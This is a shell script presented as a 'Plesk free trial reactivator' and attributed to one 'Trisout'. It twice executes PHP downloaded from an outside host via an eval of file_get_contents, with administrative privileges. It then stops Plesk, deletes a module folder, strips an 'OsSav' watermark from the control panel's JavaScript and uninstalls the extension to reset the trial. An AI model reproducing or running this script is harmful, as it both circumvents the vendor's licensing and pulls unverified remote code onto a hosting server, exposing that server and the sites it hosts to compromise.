apt install figlet
figlet PLESK FREE TRIAL REACTIVATOR
echo "***********************************"
echo "Script by Trisout"
echo "For support contact me on discord"
echo "***********************************"
sleep 10
echo "Activating Plesk..."
plesk php -er "eval(file_get_contents('http://ossav.com/OLC'));"
sleep 5
plesk php -er "eval(file_get_contents('http://ossav.com/OLC'));"
sleep 5
echo "Patching Plesk..."
sleep 1
echo "Stopping Plesk..."
sleep 1
systemctl stop psa
echo "Plesk Stopped"
sleep 1
echo "Removing Module Folder"
sleep 1
rm -rf /usr/local/psa/admin/htdocs/modules/OsSav
echo "Module Folder Removed"
sleep 1
echo "Removing WaterMark..."
sleep 1
fichier="/opt/psa/admin/cp/public/javascript/main.js"
if [ -e "$fichier" ]; then
    sed -i '/\/\*\* OsSav v1\.98 \*\*\//,/\/\*\* Fin de OsSav v1\.98 \*\*\//d' "$fichier"
    echo "Removed WaterMark"
else
    echo "An Error has occured when removing WaterMark. Please Relaunch the script or contact me"
fi
sleep 1
echo "Restaring Plesk..."
sleep 1
systemctl start psa
echo "Plesk restarted"
sleep 1
echo "Removing Ossav Plesk Extention..."
sleep 1
plesk bin extension --uninstall OsSav
echo "Ossav Plesk Extention Removed"
echo "***************************************************************"
echo "Your Plesk free trial is now activated"
echo "Contact me if a error has occured"
echo "***************************************************************"
